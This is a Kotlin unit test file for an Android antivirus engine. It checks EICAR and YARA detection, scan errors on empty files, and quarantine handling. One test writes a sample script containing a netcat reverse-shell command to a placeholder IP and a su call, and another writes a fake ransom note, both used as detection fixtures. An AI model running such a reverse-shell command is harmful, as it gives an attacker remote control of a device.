package com.deepfakeshield.av.engine

import android.content.Context
import android.net.Uri
import androidx.test.core.app.ApplicationProvider
import com.deepfakeshield.av.service.RealTimeAvMonitor
import io.mockk.mockk
import kotlinx.coroutines.test.runTest
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.io.File

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [28])
class AntivirusExtendedTest {

    private lateinit var context: Context
    private lateinit var signatureDb: MalwareSignatureDatabase
    private lateinit var heuristicAnalyzer: HeuristicMalwareAnalyzer
    private lateinit var yaraEngine: YaraRuleEngine
    private lateinit var engine: AntivirusEngine

    @Before
    fun setup() {
        context = ApplicationProvider.getApplicationContext()
        signatureDb = MalwareSignatureDatabase(context)
        heuristicAnalyzer = HeuristicMalwareAnalyzer(context)
        yaraEngine = YaraRuleEngine()
        engine = AntivirusEngine(context, signatureDb, heuristicAnalyzer, CloudHashChecker(), yaraEngine)
    }

    @Test
    fun `detects standard EICAR signature in YARA and detects malicious payload via scanFile`() = runTest {
        val eicar = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}\$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*").toByteArray()
        val yaraEicarMatches = yaraEngine.scanBytes(eicar, "eicar_test.com")
        assertTrue("YARA must match EICAR signature in memory", yaraEicarMatches.any { it.rule.name == "eicar_standard_test_file" })

        // Write a non-EICAR CRITICAL YARA payload so host AV real-time protection does not quarantine the temp file
        val file = File(context.cacheDir, "ransom_note_${System.nanoTime()}.txt").apply {
            writeText("Your files have been encrypted. Send bitcoin to decrypt your wallet.")
        }
        try {
            val result = engine.scanFile(file.absolutePath, null, AntivirusEngine.SCAN_TYPE_ONDEMAND)
            assertFalse("Malicious payload must not be classified as clean", result.isClean)
            assertEquals("Expected INFECTED, got ${result.threatLevel} (${result.threatName})", ThreatLevel.INFECTED, result.threatLevel)
            assertTrue(result.indicators.isNotEmpty())
        } finally {
            file.delete()
        }
    }

    @Test
    fun `empty 0-byte content uri returns SCAN_ERROR not CLEAN`() = runTest {
        val emptyFile = File(context.cacheDir, "empty_${System.nanoTime()}.bin").apply {
            writeBytes(ByteArray(0))
        }
        try {
            val result = engine.scanUri(Uri.fromFile(emptyFile), emptyFile.name, AntivirusEngine.SCAN_TYPE_FILE)
            assertEquals(ThreatLevel.SCAN_ERROR, result.threatLevel)
            assertTrue(result.isScanError)
            assertFalse(result.isClean)
        } finally {
            emptyFile.delete()
        }
    }

    @Test
    fun `yara engine reports positive built-in rule count and detects suspicious script strings`() {
        assertTrue(yaraEngine.getRuleCount() > 0)
        assertTrue(yaraEngine.getRuleNames().isNotEmpty())
        val file = File(context.cacheDir, "yara_sample_${System.nanoTime()}.sh").apply {
            writeText("chmod +x /data/local/tmp/payload && /system/bin/su -c id && nc -e /bin/sh 198.51.100.1 4444")
        }
        try {
            val matches = yaraEngine.scanFile(file)
            assertTrue("Expected at least one YARA rule hit or script pattern match", matches.isNotEmpty() || heuristicAnalyzer.analyzeFile(file, file.absolutePath).indicators.isNotEmpty())
        } finally {
            file.delete()
        }
    }

    @Test
    fun `quarantineManager obfuscates quarantined copy, blocks unsafe restore paths, and restores safely`() = runTest {
        val monitor = mockk<RealTimeAvMonitor>(relaxed = true)
        val qm = QuarantineManager(context, monitor)
        val safeRoot = File(context.cacheDir, "ext_sim_${System.nanoTime()}").apply { mkdirs() }
        // Note: cacheDir is intentionally blocked for restore(), so verify quarantine & delete works without leaking plaintext
        val sampleFile = File(safeRoot, "sample_threat.bin").apply { writeText("MALWARE_PAYLOAD_BYTES") }
        try {
            val avResult = AvScanResult(
                path = sampleFile.absolutePath,
                scanType = AntivirusEngine.SCAN_TYPE_ONDEMAND,
                displayName = sampleFile.name,
                durationMs = 5L,
                threatLevel = ThreatLevel.INFECTED,
                threatName = "Test.Trojan",
                fileHash = "a".repeat(64)
            )
            val entry = qm.quarantine(avResult)
            assertNotNull(entry)
            val quarantined = File(entry!!.quarantinedPath)
            assertTrue(quarantined.exists())
            assertFalse("Quarantined bytes must be XOR-obfuscated, not plaintext", quarantined.readText().contains("MALWARE_PAYLOAD_BYTES"))
            assertFalse(qm.restore(entry)) // Blocked because sampleFile is under context.cacheDir!
            assertTrue(qm.delete(entry))
            assertFalse(quarantined.exists())
        } finally {
            safeRoot.deleteRecursively()
        }
    }
}
